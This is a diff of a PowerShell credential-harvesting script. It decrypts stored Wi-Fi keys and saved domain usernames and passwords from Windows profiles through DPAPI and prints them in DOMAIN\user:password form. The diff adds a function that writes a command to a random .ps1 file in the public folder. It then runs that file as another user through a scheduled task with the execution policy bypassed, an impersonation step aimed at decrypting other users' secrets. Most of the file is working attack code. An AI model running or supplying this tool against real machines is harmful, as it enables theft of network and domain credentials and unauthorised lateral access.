@@ -1,6 +1,13 @@
-# FUNCTION TO CONVERT A HEX STRING OF FORMAT "FF0A0B0C12" INTO A BYTE ARRAY
+# ADD THE APPROPRIATE ASSEMBLIES
 Add-type -AssemblyName System.Security;
 Add-type -AssemblyName System.Text.Encoding;
+
+# ENUM
+enum WifiNetworkCredType {
+    Unknown
+    Password
+    Domain
+}
 
 class DomainCreds {
     [string] $Domain 
@@ -9,6 +16,89 @@ class DomainCreds {
     [bool] $Complete = $false 
 }
 
+# CLASS FOR NETWORK
+class WifiNetwork {
+    [string] $GUID
+    [string] $SSID 
+    [string] $DecryptedKey
+    [WifiNetworkCredType] $CredType
+    [string] $KeyMaterial
+    [string] $IsProtected
+}
+
+# EXECUTE A FUNCTION AS ANOTHER USER, REQUIRES SYSTEM PRIVILEGES
+function Invoke-RunPowershellAsUser {
+    [OutputType([string])]
+    param(
+        [string] $domain = $env:COMPUTERNAME,
+        [string] $user,
+        [string] $command 
+    )
+
+    # GENERATE RANDOM ALPHANUMERIC FILE NAME AND WRITE OUT THE COMMAND TO THE FILE
+    [string] $randomStr =  -join((65..90) +(97..122) | Get-Random -Count 10 | %{[char]$_})
+    $pathToTaskFile = "C:\users\public\$($randomStr).ps1"
+
+    Set-Content -Path $pathToTaskFile -value $command
+    Write-Host "Command: $($command)"
+
+    # CREATE A SCHEDULED TASK ACTION
+    #$action = New-ScheduledtaskAction -Execute "powershell.exe -ExecutionPolicy Bypass -File `"$($pathToTaskFile)`""
+    $action = New-ScheduledtaskAction -Execute "powershell.exe" -Argument "-ep bypass -noexit $($pathToTaskFile)"
+
+    # FORMAT FOR TIME: 'MM/DD/YYYY HH:MM:SS PM'
+    # BUILD IT TO EXECUTE 10 SECONDS IN THE FUTURE
+    $timePrefix = Get-Date -Format "MM/dd/yyyy"
+    $hours = [int] (Get-Date -Format "HH")
+    $minutes = [int] (Get-Date -Format "mm")
+    $seconds = [int] (Get-Date -Format "ss")
+    $timeSuffix = Get-Date -Format "tt" # AM/PM
+
+    # INCREMENT TEN SECONDS
+    $seconds = $seconds + 10
+
+    # ROLL OVER SECONDS INTO MINUTES IF NECESSARY
+    if ($seconds -gt 59) {
+        $seconds = $seconds % 60
+        $minutes = $minutes + 1
+
+        # ROLL OVER MINUTES INTO HOURS IF NECESSARY
+        if ($minutes -gt 59) {
+            $minutes = $minutes % 60
+            $hours = $hours + 1
+
+            # ROLL OVER HOURS IF NECESSARY
+            if ($hours -gt 12) {
+                $hours = 1
+
+                # ROLL OVER INTO PM IF NECESSARY, OTHERWISE JUST WAIT
+                if ($timeSuffix == "AM") {
+                    $timeSuffix = "PM"
+                } else {
+                    Write-Host "Error building time string, wait a few seconds and try again"
+                }
+            }
+        }
+    }
+
+    # FILL IN ZEROES AS NECESSARY
+    if ($seconds -lt 10) {$seconds = "0$($seconds)"}
+    if ($minutes -lt 10) {$minutes = "0$($minutes)"}
+    if ($hours -lt 10) {$hours = "0$($hours)"}
+
+    $timeTrigger = "$($timePrefix) $($hours):$($minutes):$($seconds) $($timeSuffix)"
+    $trigger = New-ScheduledTaskTrigger -Once -At $timeTrigger;
+    $taskName = "Launch-$($randomStr)"
+    $taskUser = "$($domain)\$($user)"
+    Write-Host "`tScheduling task for $($timeTrigger) as $($taskUser)"
+    Write-Host "`tTask name: $taskName"
+    Write-Host "`tTask Command: $($command)"
+    
+
+    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -User $user
+    $task = Get-ScheduledTask -TaskName $taskName
+    Write-Host $task 
+}
 # SLICE AN ARRAY
 function Get-ByteArraySlice {
 
@@ -41,12 +131,12 @@ function Get-ByteArraySlice {
         [int] $currentIndex = $startIndex + $i;
         $slice[$i] = $data[$currentIndex];
     }
-    Write-Host "Got Slice: $($slice); ($($startIndex), $($endIndex))"
 
     return $slice
 }
 
-function Find-SigScan {
+# FIND THE INDEX OF A BYTE ARRAY INSIDE ANOTHER BYTE ARRAY
+function Find-ByteArraySubstring {
 
     [OutputType([int])]
     param (
@@ -82,7 +172,8 @@ function Find-SigScan {
     return -1
 }
 
-function Decrypt-DomainUsername {
+# USE THE DPAPI TO PULL THE DOMAIN USERNAME
+function Unprotect-DomainUsername {
 
 
     [OutputType([DomainCreds])]
@@ -101,14 +192,14 @@ function Decrypt-DomainUsername {
     [byte[]] $nullArray = @(0x00);
     
     # SEARCH FOR USERNAME FIELD START
-    [int] $usernameFieldStart = Find-Sigscan -hayStack $unprotectedBytes -needle $searchForUsername
+    [int] $usernameFieldStart = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $searchForUsername
     
     # IF THE USERNAME FIELD START IS FOUND, THEN LOOK FOR ITS END
     if ($usernameFieldStart -ne -1) {
         Write-Host "`tFound beginning of username field!: $($usernameFieldStart), $($unprotectedBytes[$usernameFieldStart])"
 
         $usernameFieldStart += $searchForUsername.Length;
-        [int] $usernameFieldEnd = Find-SigScan -hayStack $unprotectedBytes -needle $nullArray -startAt $usernameFieldStart
+        [int] $usernameFieldEnd = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $nullArray -startAt $usernameFieldStart
         
         # IF THE END OF THE FIELD IS FOUND, GRAB IT
         if ($usernameFieldEnd -ne -1) {
@@ -119,13 +210,13 @@ function Decrypt-DomainUsername {
             $domainCreds.Username = [System.Text.Encoding]::UTF8.GetString($usernameField);
             Write-Host "`tUsername: $($domainCreds.username). Looking for domain creds"
             # THEN, FIND THE DOMAIN START
-            [int] $domainFieldStart = Find-SigScan -hayStack $unprotectedBytes -needle $nullArray -startAt ($usernameFieldEnd + 1) -invert $true;
+            [int] $domainFieldStart = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $nullArray -startAt ($usernameFieldEnd + 1) -invert $true;
 
             # CHECK FOR A DOMAIN. IF WE REACHED 0xE6 THEN NO DOMAIN WAS FOUND
             if ($domainFieldStart -ne -1 -and $unprotectedBytes[$domainFieldStart] -ne 0xE6) {
 
                 Write-Host "Found beginning of domain field!"
-                [int] $domainFieldEnd = Find-SigScan -hayStack $unprotectedBytes -needle $nullArray -startAt $domainFieldStart
+                [int] $domainFieldEnd = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $nullArray -startAt $domainFieldStart
 
                 if ($domainFieldEnd -ne -1) {
                     Write-Host "Found the end of the domain field!"
@@ -144,7 +235,7 @@ function Decrypt-DomainUsername {
         
         Write-Host "`tFailed to find beginning of username field! Trying with different bytes"
         # IF IT'S NOT FOUND, MAYBE IT'S NOT ENCRYPTED
-        $usernameFieldStart = Find-SigScan -hayStack $unprotectedBytes -needle $searchForUsername2
+        $usernameFieldStart = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $searchForUsername2
         Write-Host $usernameFieldStart
 
         if ($usernameFieldStart -ne -1) {
@@ -152,26 +243,26 @@ function Decrypt-DomainUsername {
             # MAYBE WE DO ACTUALLY HAVE A DOMAIN?
             # SKIP NULL BYTES
             $usernameFieldStart += $searchForUsername2.Length;
-            $usernameFieldStart = Find-SigScan -hayStack $unprotectedBytes -needle $nullArray -startAt $usernameFieldStart -invert $true 
+            $usernameFieldStart = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $nullArray -startAt $usernameFieldStart -invert $true 
 
             # FIND WHERE THE DOMAIN FIELD ENDS
-            [int] $usernameFieldEnd = Find-SigScan -hayStack $unprotectedBytes -needle $nullArray -startAt ($usernameFieldEnd + 1) -invert $true
+            [int] $usernameFieldEnd = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $nullArray -startAt ($usernameFieldEnd + 1) -invert $true
             [byte[]] $usernameField = Get-ByteArraySlice -data $unprotectedBytes -startIndex $usernameFieldStart -endIndex $usernameFieldEnd
             $domainCreds.Username = [System.Text.Encoding]::UTF8.GetString($usernameField)
 
             # LOOK FOR THE PASSWORD FIELD
-            [int] $passwordFieldStart = Find-SigScan -hayStack $unprotectedBytes -needle $nullArray -startAt ($usernameFieldEnd + 1) -invert $true
+            [int] $passwordFieldStart = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $nullArray -startAt ($usernameFieldEnd + 1) -invert $true
             if ($passwordFieldStart -ne -1) {
 
-                [int] $passwordFieldEnd = Find-SigScan -hayStack $unprotectedBytes -needle $nullArray -startAt ($passwordFieldStart + 1)
+                [int] $passwordFieldEnd = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $nullArray -startAt ($passwordFieldStart + 1)
                 if ($passwordFieldEnd -ne -1) {
                     [byte[]] $passwordField = Get-ByteArraySlice -data $unprotectedBytes -startIndex $passwordFieldStart -endIndex $passwordFieldEnd
                     $domainCreds.Password = [System.Text.Encoding]::UTF8.GetString($passwordField)
                     
                     # LOOK FOR THE DOMAIN FIELD
-                    [int] $domainFieldStart = Find-SigScan -hayStack $unprotectedBytes -needle $nullArray -startAt ($passwordFieldEnd + 1) -invert $true
+                    [int] $domainFieldStart = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $nullArray -startAt ($passwordFieldEnd + 1) -invert $true
                     if ($domainFieldStart -ne -1) {
-                        [int] $domainFieldEnd = Find-SigScan -hayStack $unprotectedBytes -needle $nullArray -startAt ($domainFieldStart + 1)
+                        [int] $domainFieldEnd = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $nullArray -startAt ($domainFieldStart + 1)
                         if ($domainFieldEnd -ne -1) {
                             [byte[]] $domainField = Get-ByteArraySlice -data $unprotectedBytes -startIndex $passwordFieldStart -endIndex $passwordFieldEnd
                             if ($domainField[0] -ne 0x01) {
@@ -193,7 +284,9 @@ function Decrypt-DomainUsername {
 
 }
 
-function Decrypt-DomainPassword {
+# USE THE DPAPI TO PULL THE DOMAIN PASSWORD
+function Unprotect-DomainPassword
+ {
     [OutputType([DomainCreds])]
     param (
         [byte[]] $unprotectedBytes,
@@ -203,14 +296,15 @@ function Decrypt-DomainPassword {
     [byte[]] $searchForPassword = @( 0x01, 0x00, 0x00, 0x00, 0xD0, 0x8C, 0x9D, 0xDF, 0x01)
 
     # CHECK FOR THE ENCRYPTED DATA CHUNK
-    [int] $passwordFieldStart = Find-SigScan -hayStack $unprotectedBytes -needle $searchForPassword
+    [int] $passwordFieldStart = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $searchForPassword
     if ($passwordFieldStart -ne -1) {
-        Write-Host "`tFound password blob!"
+        Write-Host "`tFound password blob with start index $($passwordFieldStart)"
+        [byte[]] $protectedPasswordBytes = Get-ByteArraySlice -data $unprotectedBytes -startIndex $passwordFieldStart -endIndex $unprotectedBytes.Length
 
         try {
             # TRY TO UNPROTECT THE PASSWORD - NEEDS TO BE RUN AS THE USER IN QUESTION
             Write-Host "Trying to unprotect password"
-            [byte[]] $unprotectedPassword = [System.Security.Cryptography.ProtectedData]::Unprotect($unprotectedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine);
+            [byte[]] $unprotectedPassword = [System.Security.Cryptography.ProtectedData]::Unprotect($protectedPasswordBytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine);
 
             # STRIP NULL BYTES
             for ($i = 0; $i -lt $unprotectedPassword.Length; $i++) {
@@ -229,6 +323,8 @@ function Decrypt-DomainPassword {
         catch {
             Write-Host "An error occurred: $($_) - Most likely you need to run this as the user who owns the password"
             Write-Host "Trying a workaround to impersonate the target user with a scheduled task! This may take a few seconds..."
+
+            # TODO: WRITE OUT THE BYTES TO A FILE, SCHEDULE A TASK TO DO THE DECRYPTION, AND THEN READ THEM BACK IN 
             return $domainCreds
         }
     } else {
@@ -236,21 +332,7 @@ function Decrypt-DomainPassword {
     }
     return $domainCreds
 }
-# ENUM
-enum WifiNetworkCredType {
-    Unknown
-    Password
-    Domain
-}
-# CLASS FOR NETWORK
-class WifiNetwork {
-    [string] $GUID
-    [string] $SSID 
-    [string] $DecryptedKey
-    [WifiNetworkCredType] $CredType
-    [string] $KeyMaterial
-    [string] $IsProtected
-}
+
 
 # STORE NETWORKS
 [WifiNetwork[]] $foundNetworks = @();
@@ -393,9 +475,9 @@ for ($a = 0; $a -lt $notFoundNetworks.Count; $a++) {
                     $unprotectedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($protectedKey, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine);
                     
                     # THEN, DECRYPT/DECIPHER IT FROM THE WEIRD FORMAT
-                    [DomainCreds] $domainCreds = Decrypt-DomainUsername -unprotectedBytes $unprotectedKey
+                    [DomainCreds] $domainCreds = Unprotect-DomainUsername -unprotectedBytes $unprotectedKey
                     Write-Host $domainCreds
-                    $domainCreds = Decrypt-DomainPassword -unprotectedBytes $unprotectedKey -domainCreds $domainCreds
+                    $domainCreds = Unprotect-DomainPassword -unprotectedBytes $unprotectedKey -domainCreds $domainCreds
                     Write-Host $domainCreds
                     if ($domainCreds.Domain) {
                         $network.DecryptedKey = "$($domainCreds.Domain)\$($domainCreds.Username):$($domainCreds.Password)"
